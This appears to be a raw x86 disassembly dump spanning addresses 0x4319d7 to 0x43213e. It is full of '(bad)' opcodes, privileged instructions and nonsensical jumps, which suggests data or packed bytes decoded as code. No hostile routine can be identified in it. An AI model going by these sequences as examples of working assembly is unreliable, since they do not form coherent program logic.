  4319d7:	adc    DWORD PTR [ecx],esi
  4319d9:	pop    esi
  4319da:	inc    ecx
  4319db:	leave  
  4319dc:	or     DWORD PTR [eax],ebx
  4319de:	gs push ebp
  4319e0:	add    ah,ch
  4319e2:	into   
  4319e3:	in     al,dx
  4319e4:	enter  0xb756,0xf0
  4319e8:	push   cs
  4319e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319f9:	jnp    0x74439f01
  4319ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a05:	add    BYTE PTR [edi],cl
  431a07:	mov    edi,DWORD PTR [ecx-0x78]
  431a0a:	ltr    WORD PTR [ecx-0x7b]
  431a0e:	dec    DWORD PTR [edi]
  431a10:	clc    
  431a11:	out    0x45,eax
  431a13:	add    BYTE PTR [eax],cl
  431a15:	cmp    ebx,0xffffff8c
  431a18:	jge    0x431a1a
  431a1a:	jb     0x431a2c
  431a1c:	je     0x521a9c
  431a22:	pop    edx
  431a23:	push   esi
  431a24:	mov    ecx,DWORD PTR [edi]
  431a26:	in     al,dx
  431a27:	rol    DWORD PTR [ebp+0x0],1
  431a2a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a31:	cmp    DWORD PTR [ecx],0xfffffff0
  431a34:	hlt    
  431a35:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a3b:	(bad)  
  431a3d:	push   eax
  431a3e:	jns    0xb842febc
  431a44:	lock push cs
  431a46:	ror    edx,0x3
  431a49:	test   BYTE PTR [ecx+0x5500e800],cl
  431a4f:	dec    eax
  431a50:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a54:	(bad)  
  431a55:	mov    esi,0x7f33ff5f
  431a5a:	inc    eax
  431a5b:	test   DWORD PTR [edx],eax
  431a5d:	je     0x431a1f
  431a5f:	mov    ecx,ecx
  431a61:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a65:	and    eax,DWORD PTR [eax+0xf0103]
  431a6b:	jp     0x431a59
  431a6d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a71:	add    edx,DWORD PTR [edi+0x74]
  431a74:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a7a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a80:	je     0x431a05
  431a82:	cmp    eax,edi
  431a84:	js     0x431aa9
  431a86:	add    eax,0xeb0fc003
  431a8b:	jns    0x431a18
  431a8d:	vmread DWORD PTR [ecx+0x45],ebx
  431a91:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a97:	adc    al,0x8b
  431a99:	jge    0x431aaf
  431a9b:	mov    edi,DWORD PTR [eax-0x4]
  431a9e:	add    edi,DWORD PTR [edi]
  431aa0:	or     bh,bh
  431aa2:	push   ebp
  431aa3:	push   es
  431aa4:	mov    DWORD PTR [ebp-0x4],ebx
  431aa7:	add    edi,esi
  431aa9:	pop    es
  431aaa:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ab0:	mov    DWORD PTR [esp+esi*8],ecx
  431ab3:	inc    ebp
  431ab4:	pop    ebp
  431ab5:	xor    DWORD PTR [esi-0x4],0x3b
  431ab9:	add    edx,DWORD PTR [ecx+edi*1]
  431abc:	push   es
  431abd:	clc    
  431abe:	mov    bh,0xdb
  431ac0:	jp     0x431a79
  431ac2:	add    cl,BYTE PTR [esi]
  431ac4:	div    DWORD PTR [edi+0x4d8b0c1c]
  431aca:	test   edi,edi
  431acc:	je     0x431ac2
  431ace:	mov    eax,ecx
  431ad0:	or     BYTE PTR [ebx],al
  431ad2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431ad8:	jbe    0x431b4c
  431ada:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431ae0:	add    ecx,DWORD PTR [esi]
  431ae2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431ae8:	add    eax,DWORD PTR [ebx-0x287af783]
  431aee:	je     0x431b3d
  431af0:	mov    DWORD PTR [ecx],edi
  431af2:	mov    esi,eax
  431af4:	hlt    
  431af5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431afc:	jb     0x431abe
  431afe:	jmp    0x431aeb
  431b00:	xor    esi,DWORD PTR [ebx]
  431b02:	pop    edi
  431b03:	pop    esi
  431b04:	pop    ebx
  431b05:	ret    
  431b06:	ret    0x8b
  431b09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b0f:	xor    DWORD PTR [ecx],0xc
  431b12:	pushf  
  431b13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b19:	rdmsr  
  431b1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b22:	dec    ebp
  431b23:	ret    
  431b24:	mov    edi,DWORD PTR [esi-0x4]
  431b27:	pop    eax
  431b28:	dec    ebp
  431b29:	jne    0x431ab6
  431b2b:	xor    edi,esp
  431b2d:	inc    eax
  431b2e:	dec    ebp
  431b2f:	jbe    0x431b84
  431b31:	inc    eax
  431b32:	pop    ebp
  431b33:	add    edx,DWORD PTR [esi+0x8]
  431b36:	push   esp
  431b37:	dec    eax
  431b38:	push   ecx
  431b39:	mov    eax,edi
  431b3b:	and    al,0xf0
  431b3d:	jo     0x431b2a
  431b3f:	mov    eax,DWORD PTR [ebx]
  431b41:	sbb    BYTE PTR [ebp+0x4d],cl
  431b44:	mov    eax,DWORD PTR [ebx]
  431b46:	nop
  431b47:	or     BYTE PTR [eax],al
  431b49:	jne    0x431ba2
  431b4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b51:	cld    
  431b52:	xor    edi,edi
  431b54:	add    edi,DWORD PTR [ebp+0x3]
  431b57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b5d:	js     0x431ae3
  431b5f:	jae    0x431b63
  431b61:	(bad)  
  431b63:	xor    al,0x5d
  431b65:	jmp    0x431af2
  431b67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b6e:	fdecstp 
  431b70:	test   BYTE PTR [edi],ah
  431b72:	add    bh,BYTE PTR [ebp+0x0]
  431b75:	add    ebx,DWORD PTR [ebp-0x77]
  431b78:	mov    edi,eax
  431b7a:	cmp    al,0x0
  431b7d:	adc    dh,BYTE PTR [ebx]
  431b7f:	jge    0x431b84
  431b81:	mov    edi,DWORD PTR [ebx]
  431b83:	jl     0x431b94
  431b85:	clc    
  431b86:	dec    edi
  431b87:	jge    0x431b89
  431b89:	mov    eax,DWORD PTR [ebx]
  431b8b:	jb     0x431b95
  431b8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b90:	mov    edi,edi
  431b92:	xor    edx,DWORD PTR [eax]
  431b94:	add    edi,DWORD PTR [ebx]
  431b96:	mov    DWORD PTR [ebp-0x10],edi
  431b99:	inc    edi
  431b9a:	pop    ebp
  431b9b:	jge    0x431bd8
  431b9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ba1:	mov    edx,0xc05d87f0
  431ba6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431baa:	fimul  WORD PTR [eax]
  431bac:	fist   WORD PTR [ebp+0x1c]
  431baf:	in     al,dx
  431bb0:	jne    0x431b9e
  431bb2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bb8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bbc:	fdivp  st(0),st
  431bbe:	fild   WORD PTR [ebp+0x4510f85c]
  431bc4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bca:	inc    ebp
  431bcb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431bd1:	mov    ebp,DWORD PTR [ebx-0x4]
  431bd4:	adc    al,0x8b
  431bd6:	rcl    DWORD PTR [eax],0x48
  431bd9:	mov    esi,0x7080803
  431bde:	fiadd  WORD PTR [ebp+0x4d]
  431be1:	(bad)  
  431be2:	mov    edx,DWORD PTR [edx-0x4]
  431be5:	mov    edx,DWORD PTR [ebp-0x4]
  431be8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bee:	mov    DWORD PTR [edi+0x872dc],edi
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	into   
  431bf6:	ffreep st(6)
  431bf8:	retf   0x6c7
  431bfb:	iret   
  431bfc:	dec    ebp
  431bfd:	inc    ebp
  431bfe:	mov    DWORD PTR [ebx],edi
  431c00:	fmul   QWORD PTR [edi]
  431c02:	dec    ebp
  431c03:	jnp    0x431c38
  431c05:	add    BYTE PTR [ebx],al
  431c07:	mov    ecx,DWORD PTR [esp+edi*8]
  431c0a:	inc    ebp
  431c0b:	dec    ebp
  431c0c:	lea    esi,[ebx]
  431c0e:	add    DWORD PTR [ebx],eax
  431c10:	jb     0x431c4d
  431c12:	add    BYTE PTR [edi],cl
  431c14:	inc    ebp
  431c15:	imul   eax,edi,0x858bd800
  431c1b:	cld    
  431c1c:	clc    
  431c1d:	mov    DWORD PTR [ebp+0x0],eax
  431c20:	inc    DWORD PTR [eax]
  431c22:	or     al,0xde
  431c24:	sbb    bh,0x1
  431c27:	retf   
  431c28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c2f:	dec    ebp
  431c30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c36:	enter  0x12de,0xdf
  431c3a:	inc    ebp
  431c3b:	pop    ebp
  431c3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c42:	add    DWORD PTR [edx],edx
  431c44:	add    BYTE PTR [ebp+0x50],dl
  431c47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c53:	or     ah,al
  431c55:	pop    ss
  431c56:	cdq    
  431c57:	push   ebp
  431c58:	clc    
  431c59:	mov    eax,DWORD PTR [ebp-0x4]
  431c5c:	xor    edx,edx
  431c5e:	add    esi,DWORD PTR [ebx]
  431c60:	cmp    eax,DWORD PTR [ebx]
  431c62:	hlt    
  431c63:	cmp    DWORD PTR [ebx],esp
  431c65:	or     al,BYTE PTR [ebp+0xf]
  431c68:	mov    eax,DWORD PTR [edx]
  431c6a:	loopne 0x431c6c
  431c6c:	(bad)  
  431c6d:	mov    ecx,esi
  431c6f:	cld    
  431c70:	pushf  
  431c71:	pop    ebp
  431c72:	fwait
  431c73:	mov    esi,DWORD PTR [edx]
  431c75:	lock mov eax,eax
  431c78:	adc    BYTE PTR [ebx],al
  431c7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c87:	dec    ebp
  431c88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c8e:	(bad)  
  431c8f:	iret   
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	jne    0x431ce1
  431c94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c9a:	(bad)  
  431c9b:	cmp    ebx,eax
  431c9d:	je     0x431c25
  431c9f:	add    edi,edi
  431ca1:	or     bh,bh
  431ca3:	dec    ebp
  431ca4:	inc    ebp
  431ca5:	mov    esi,DWORD PTR [ebx]
  431ca7:	cld    
  431ca8:	add    ecx,esi
  431caa:	cmp    ecx,DWORD PTR [eax-0xc]
  431cad:	mov    edx,DWORD PTR [edi]
  431caf:	or     BYTE PTR [ebp-0x7c],al
  431cb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431cb8:	test   BYTE PTR [ebx+ebx*4],cl
  431cbb:	inc    ebp
  431cbc:	xor    bh,BYTE PTR [esi]
  431cbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cc5:	jne    0x431c8e
  431cc7:	mov    ebp,esp
  431cc9:	fcomp  DWORD PTR [ebx]
  431ccb:	add    BYTE PTR [ecx],al
  431ccd:	inc    DWORD PTR [ebp-0x75]
  431cd0:	(bad)  
  431cd1:	cld    
  431cd2:	add    al,0xce
  431cd4:	mov    ecx,edi
  431cd6:	cld    
  431cd7:	inc    ebp
  431cd8:	fidivr WORD PTR [ebx]
  431cda:	fbstp  TBYTE PTR [ebp-0x3e]
  431cdd:	mov    eax,DWORD PTR [eax]
  431cdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ce5:	fadd   st,st(7)
  431ce7:	add    BYTE PTR [ebp-0x1],al
  431cea:	mov    ecx,DWORD PTR [esp+edi*8]
  431ced:	inc    ebp
  431cee:	mov    bh,0xc7
  431cf1:	loopne 0x431d38
  431cf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cf9:	sbb    dh,BYTE PTR [ebx]
  431cfb:	pushf  
  431cfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d02:	mov    eax,edi
  431d04:	cwde   
  431d05:	inc    ebp
  431d06:	inc    ebp
  431d07:	jne    0x431c94
  431d09:	mov    esp,esp
  431d0b:	clc    
  431d0c:	add    al,0x4d
  431d0e:	mov    DWORD PTR [ebx],esi
  431d10:	or     al,0x33
  431d12:	inc    ebp
  431d13:	lea    ecx,[ebx-0x398d13fd]
  431d19:	add    bh,al
  431d1b:	inc    ebp
  431d1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d23:	add    ebp,esp
  431d25:	shufps xmm1,xmm3,0xc7
  431d29:	(bad)  
  431d2a:	jmp    0x74885853
  431d2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d35:	hlt    
  431d36:	mov    ecx,DWORD PTR [edi]
  431d38:	fadd   DWORD PTR [ebp+0x0]
  431d3b:	xor    ecx,DWORD PTR [edi]
  431d3d:	add    ecx,ecx
  431d3f:	cmp    edi,edi
  431d41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d45:	(bad)  
  431d46:	jmp    0x431cd3
  431d48:	mov    edi,esp
  431d4a:	or     al,0xc6
  431d4c:	inc    ebp
  431d4d:	(bad)  
  431d4e:	mov    eax,DWORD PTR [ebp+0x10]
  431d51:	jne    0x431cdc
  431d53:	mov    eax,DWORD PTR [ecx]
  431d55:	clc    
  431d56:	add    BYTE PTR [ebp-0x40],cl
  431d59:	xor    edx,DWORD PTR [eax-0x73]
  431d5c:	jne    0x431d5f
  431d5e:	push   DWORD PTR [edx+0x8]
  431d61:	add    BYTE PTR [ebp+0x45],al
  431d64:	mov    ebp,ecx
  431d66:	cld    
  431d67:	add    BYTE PTR [ebp+0x0],cl
  431d6a:	xor    eax,DWORD PTR [ebp+0x3]
  431d6d:	mov    DWORD PTR [ebx],edi
  431d6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d75:	sub    eax,0x5d330e4d
  431d7a:	lea    esi,[ebx]
  431d7c:	add    DWORD PTR [ebx],eax
  431d7e:	jb     0x431d69
  431d80:	add    BYTE PTR [eax],al
  431d82:	inc    ebp
  431d83:	add    bl,ch
  431d85:	inc    ebp
  431d86:	mov    esi,DWORD PTR [ebx]
  431d88:	or     al,0x3
  431d8a:	(bad)  
  431d8b:	mov    edi,eax
  431d8d:	in     al,dx
  431d8e:	scas   eax,DWORD PTR es:[edi]
  431d8f:	inc    ebp
  431d90:	mov    esi,DWORD PTR [ebx]
  431d92:	in     al,0x3
  431d94:	add    al,0x89
  431d96:	mov    ecx,DWORD PTR [eax+edi*8]
  431d99:	dec    ebp
  431d9a:	(bad)  
  431d9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431da2:	mov    ecx,eax
  431da4:	cld    
  431da5:	push   es
  431da6:	dec    ebp
  431da7:	add    al,0x33
  431da9:	mov    DWORD PTR [ebx],eax
  431dab:	in     al,dx
  431dac:	cmp    DWORD PTR [ebp-0x67],eax
  431daf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431db5:	mov    edx,DWORD PTR [ebp-0x4]
  431db8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dbb:	xor    eax,DWORD PTR [ebp+0x3]
  431dbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431dc4:	xor    edi,esp
  431dc6:	jmp    0xff771b18
  431dcb:	add    ecx,DWORD PTR [ebp-0x3f]
  431dce:	xor    ebx,DWORD PTR [edi]
  431dd0:	add    eax,ecx
  431dd2:	cmp    ebx,DWORD PTR [eax]
  431dd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431dd7:	mov    ecx,DWORD PTR [eax]
  431dd9:	adc    BYTE PTR [ebp-0x80],al
  431ddc:	jmp    0x431ddf
  431dde:	mov    eax,DWORD PTR [eax]
  431de0:	cld    
  431de1:	mov    bh,0xc6
  431de3:	push   ecx
  431de4:	(bad)  
  431de5:	jne    0x431e45
  431de7:	dec    ecx
  431de9:	or     BYTE PTR [ecx+ebx*1],cl
  431dec:	push   ebp
  431ded:	inc    ebp
  431dee:	in     al,dx
  431def:	add    ebp,esp
  431df1:	or     bh,al
  431df3:	dec    ebp
  431df4:	cld    
  431df5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dfb:	xor    DWORD PTR [edx],0x2
  431dfe:	pushf  
  431dff:	dec    DWORD PTR [ebx+0x45510cf4]
  431e05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e0b:	mov    edx,DWORD PTR [ecx+0xc]
  431e0e:	xor    eax,esi
  431e10:	mov    edx,0xc172c7
  431e15:	inc    ebp
  431e16:	mov    esi,DWORD PTR [ebp+0x8]
  431e19:	mov    eax,edx
  431e1b:	call   0x84c7e510
  431e20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e26:	mov    ebp,eax
  431e28:	or     BYTE PTR [eax],dl
  431e2a:	jo     0x431e79
  431e2c:	push   edi
  431e2d:	xor    esi,DWORD PTR [ebp+0x3]
  431e30:	(bad)  
  431e31:	pmulhuw mm0,mm1
  431e34:	test   DWORD PTR [ebp-0x8],ecx
  431e37:	mov    DWORD PTR [ebp-0x67],eax
  431e3a:	mov    eax,DWORD PTR [ebp-0x4]
  431e3d:	xor    edi,DWORD PTR [ebp-0x73]
  431e40:	xor    eax,DWORD PTR [ebx]
  431e42:	xor    esi,DWORD PTR [edx+0x3]
  431e45:	add    BYTE PTR [ecx],bh
  431e47:	inc    ebp
  431e48:	(bad)  
  431e49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e4f:	mov    DWORD PTR [eax],0x750f0004
  431e55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e5b:	lock add BYTE PTR [ebp+0x0],cl
  431e5f:	mov    esi,DWORD PTR [ebp-0x18]
  431e62:	mov    ebp,edx
  431e64:	or     al,0x72
  431e66:	ja     0x431e68
  431e68:	mov    edx,esi
  431e6a:	cld    
  431e6b:	(bad)  
  431e6e:	cli    
  431e6f:	mov    esi,DWORD PTR [ebp-0x4]
  431e72:	cmp    ecx,esi
  431e74:	bswap  edi
  431e76:	(bad)
  431e7a:	mov    esi,DWORD PTR [ebp-0x4]
  431e7d:	mov    esi,ecx
  431e7f:	clc    
  431e80:	repnz add esi,DWORD PTR [ebp+0x45]
  431e84:	push   ebx
  431e85:	xor    eax,DWORD PTR [ebp+0x3]
  431e88:	cmp    al,0x5f
  431e8a:	pushf  
  431e8b:	pop    ebx
  431e8c:	jmp    0x431f53
  431e91:	mov    esi,DWORD PTR [ebp-0x7d]
  431e94:	xor    ebp,DWORD PTR [eax]
  431e96:	lea    eax,[ebp-0x8]
  431e99:	xor    edx,esi
  431e9b:	pushf  
  431e9c:	out    dx,eax
  431e9d:	(bad)  
  431e9e:	neg    eax
  431ea0:	ins    DWORD PTR es:[edi],dx
  431ea1:	test   esi,edi
  431ea3:	clc    
  431ea4:	pop    esp
  431ea5:	inc    ebp
  431ea6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431eac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431eb2:	add    cl,al
  431eb4:	jne    0x431e51
  431eb6:	mov    esi,DWORD PTR [edx]
  431eb8:	in     al,dx
  431eb9:	push   esi
  431eba:	xor    BYTE PTR [ebp-0xe],dh
  431ebd:	add    edi,esi
  431ebf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ec5:	add    cl,bh
  431ec7:	mov    edi,DWORD PTR [ebp+0x8]
  431eca:	mov    DWORD PTR [ebp-0x14],esi
  431ecd:	add    esi,DWORD PTR [ebp+0x3c]
  431ed0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431ed6:	mov    ah,0x3e
  431ed8:	fwait
  431ed9:	pushf  
  431eda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ee0:	jne    0x431e6d
  431ee2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ee5:	icebp  
  431ee6:	icebp  
  431ee7:	shl    edx,0xf2
  431eea:	(bad)  
  431eeb:	mov    ah,0x16
  431eed:	push   eax
  431eee:	jne    0x431e83
  431ef0:	mov    ecx,DWORD PTR [edi]
  431ef2:	in     al,dx
  431ef3:	jmp    0x431ee6
  431ef5:	add    dl,dh
  431ef7:	mov    edi,esi
  431ef9:	or     al,0x8
  431efb:	inc    ebp
  431efc:	jne    0x431f01
  431efe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f04:	ret    
  431f05:	or     bh,bh
  431f07:	jge    0x431ef1
  431f09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f0f:	xor    edi,eax
  431f11:	add    esi,DWORD PTR [ebp-0x77]
  431f14:	mov    ebx,esp
  431f16:	clc    
  431f17:	neg    DWORD PTR [ebp-0x7c]
  431f1a:	xor    eax,DWORD PTR [eax]
  431f1c:	cmp    eax,DWORD PTR [eax]
  431f1e:	repz jne 0x431eb6
  431f21:	xor    eax,DWORD PTR [ecx]
  431f23:	add    ebx,DWORD PTR [eax]
  431f25:	mov    DWORD PTR [ebp-0x8],eax
  431f28:	mov    eax,edi
  431f2a:	cld    
  431f2b:	lock pop eax
  431f2d:	test   DWORD PTR [ebx],esi
  431f2f:	clc    
  431f30:	add    edx,DWORD PTR [edi-0x740bff77]
  431f36:	fdivp  st(4),st
  431f38:	test   ecx,esi
  431f3a:	(bad)  
  431f3b:	jnp    0x431f3c
  431f3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f43:	jae    0x431ed0
  431f45:	sub    edi,esp
  431f47:	(bad)  
  431f48:	shl    DWORD PTR [eax-0x3e],0x89
  431f4c:	leave  
  431f4d:	call   0x8198d65a
  431f52:	in     al,dx
  431f53:	(bad)  
  431f54:	in     al,dx
  431f55:	add    bh,al
  431f57:	mov    esp,edi
  431f59:	in     al,dx
  431f5a:	test   DWORD PTR [ebp-0x8],edi
  431f5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431f60:	xor    al,BYTE PTR [ebx]
  431f62:	pushf  
  431f63:	jnp    0x57321b9c
  431f69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f6d:	loopne 0x431fa2
  431f6f:	jne    0x431f2c
  431f71:	mov    esi,DWORD PTR [edx-0x20]
  431f74:	add    BYTE PTR [ebp-0x3d],bh
  431f77:	xor    eax,DWORD PTR [ebp-0x73]
  431f7a:	mov    edi,DWORD PTR [esi]
  431f7c:	cld    
  431f7d:	jb     0x431f45
  431f7f:	add    bl,al
  431f81:	jne    0x431fc8
  431f83:	mov    edx,DWORD PTR [edi-0x10]
  431f86:	jge    0x432005
  431f88:	mov    esi,DWORD PTR [ebx]
  431f8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f8e:	xor    esi,DWORD PTR [ebp-0x77]
  431f91:	mov    esi,eax
  431f93:	lock inc ebp
  431f95:	jge    0x431fc8
  431f97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f9e:	dec    ebp
  431f9f:	mov    esi,DWORD PTR [ebx]
  431fa1:	loopne 0x431f2c
  431fa3:	jge    0x431f9d
  431fa5:	add    DWORD PTR [ebp-0x7d],eax
  431fa8:	icebp  
  431fa9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fb0:	dec    ebp
  431fb1:	hlt    
  431fb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431fb5:	mov    esi,esp
  431fb7:	in     al,0x45
  431fb9:	jge    0x431ff8
  431fbb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fc2:	dec    ebp
  431fc3:	push   esp
  431fc4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fca:	inc    ebp
  431fcb:	hlt    
  431fcc:	xor    DWORD PTR [ebp-0x61],esi
  431fcf:	mov    edi,DWORD PTR [eax+0xf19504]
  431fd5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fd9:	cmp    eax,DWORD PTR [ebp+0xf]
  431fdc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fe0:	fistp  WORD PTR [ebx+0x0]
  431fe3:	inc    ebp
  431fe4:	mov    ebx,DWORD PTR [edi+0xc]
  431fe7:	add    eax,eax
  431fe9:	inc    ebp
  431fea:	test   BYTE PTR [ebx],dh
  431fec:	add    eax,DWORD PTR [ebx]
  431fee:	add    BYTE PTR [esi+0x45],bl
  431ff1:	ret    0x85
  431ff4:	jnp    0x5443a3c3
  431ffa:	inc    bp
  431ffc:	inc    ebp
  431ffd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432003:	fdiv   QWORD PTR [ebx]
  432005:	test   DWORD PTR [ecx+0x453bf8],edi
  43200b:	push   ebx
  43200c:	add    edi,DWORD PTR [esi+0x708088b]
  432012:	cmp    esi,eax
  432014:	setnp  BYTE PTR [ecx-0x74fcffce]
  43201b:	mov    esp,edi
  43201d:	call   0x33ce656f
  432022:	or     BYTE PTR [ebx],al
  432024:	inc    ecx
  432025:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43202b:	and    BYTE PTR [ebp-0x7074f0bb],al
  432031:	lock add cl,al
  432034:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43203b:	mov    ch,0x45
  43203d:	clc    
  43203e:	xor    eax,DWORD PTR [ebp+0x3]
  432041:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432047:	inc    ebp
  432048:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  43204e:	mov    edi,eax
  432050:	mov    eax,DWORD PTR [ebp+0x3c]
  432053:	mov    ecx,DWORD PTR [eax]
  432055:	hlt    
  432056:	inc    ebp
  432057:	ror    DWORD PTR [ebx+0x818c45],0xf4
  43205e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432064:	push   ebp
  432065:	mov    edi,DWORD PTR [ebx]
  432067:	in     al,dx
  432068:	jne    0x43202b
  43206a:	mov    eax,DWORD PTR [ebp-0x28]
  43206d:	add    DWORD PTR [eax],0xe8058dec
  432073:	clc    
  432074:	mov    esi,DWORD PTR [edi-0x8]
  432077:	add    dh,dl
  432079:	rol    WORD PTR [ebp-0x1],cl
  43207d:	mov    edx,DWORD PTR [eax+0x8]
  432080:	jne    0x432042
  432082:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432089:	inc    ebp
  43208a:	push   esp
  43208b:	test   DWORD PTR [ecx+0xf],ecx
  43208e:	sub    edx,esp
  432090:	add    eax,DWORD PTR [eax]
  432092:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432098:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43209f:	mov    eax,DWORD PTR [ecx]
  4320a1:	and    BYTE PTR [eax],al
  4320a3:	cmp    al,0x10
  4320a5:	add    BYTE PTR [ebp+0x66],al
  4320a8:	inc    ecx
  4320aa:	push   esp
  4320ab:	add    dh,BYTE PTR [ebp+0x0]
  4320ae:	push   edx
  4320af:	enterw 0xc1,0x4d
  4320b4:	mov    esp,DWORD PTR [esi+0x20]
  4320b7:	add    DWORD PTR [ecx-0x7b],eax
  4320ba:	add    eax,DWORD PTR [ebx]
  4320bc:	str    WORD PTR [eax+0x45]
  4320c0:	lea    ecx,[ebx+0x45890801]
  4320c6:	sbb    BYTE PTR [ebx],al
  4320c8:	dec    ebp
  4320c9:	cmp    al,0xf
  4320cb:	inc    ebp
  4320cc:	push   eax
  4320cd:	mov    esi,DWORD PTR [ebx]
  4320cf:	push   eax
  4320d0:	add    eax,eax
  4320d2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320d9:	inc    ebp
  4320da:	add    BYTE PTR [ecx],dh
  4320dc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320e3:	(bad)  
  4320e4:	mov    ebx,eax
  4320e6:	loopne 0x43212d
  4320e8:	dec    ebp
  4320e9:	mov    ecx,DWORD PTR [edi]
  4320eb:	cld    
  4320ec:	push   eax
  4320ed:	xchg   DWORD PTR [ebx],esi
  4320ef:	add    DWORD PTR [ebx],ebp
  4320f1:	add    BYTE PTR [ebx],ch
  4320f3:	or     BYTE PTR [ecx],bh
  4320f5:	dec    ecx
  4320f6:	loopne 0x4320fb
  4320f8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320fe:	push   ebp
  4320ff:	add    DWORD PTR [ebx+0x55100800],eax
  432105:	dec    ebp
  432106:	jmp    0x432091
  432108:	mov    esp,DWORD PTR [eax]
  43210a:	sbb    dl,dl
  43210c:	inc    eax
  43210d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432113:	add    BYTE PTR [ebx+0x74528555],cl
  432119:	push   ebp
  43211a:	div    DWORD PTR [ebx]
  43211c:	and    eax,DWORD PTR [ebx]
  43211e:	add    edx,DWORD PTR [edx-0x30]
  432121:	jno    0x4320ae
  432123:	inc    DWORD PTR [eax+eiz*1]
  432126:	inc    ebp
  432127:	push   eax
  432128:	push   eax
  432129:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43212f:	mov    edi,esp
  432131:	push   eax
  432132:	inc    ebp
  432133:	enter  0x458b,0x8
  432137:	push   ecx
  432138:	(bad)  
  432139:	call   0x10d2b11
  43213e:	pop    ss
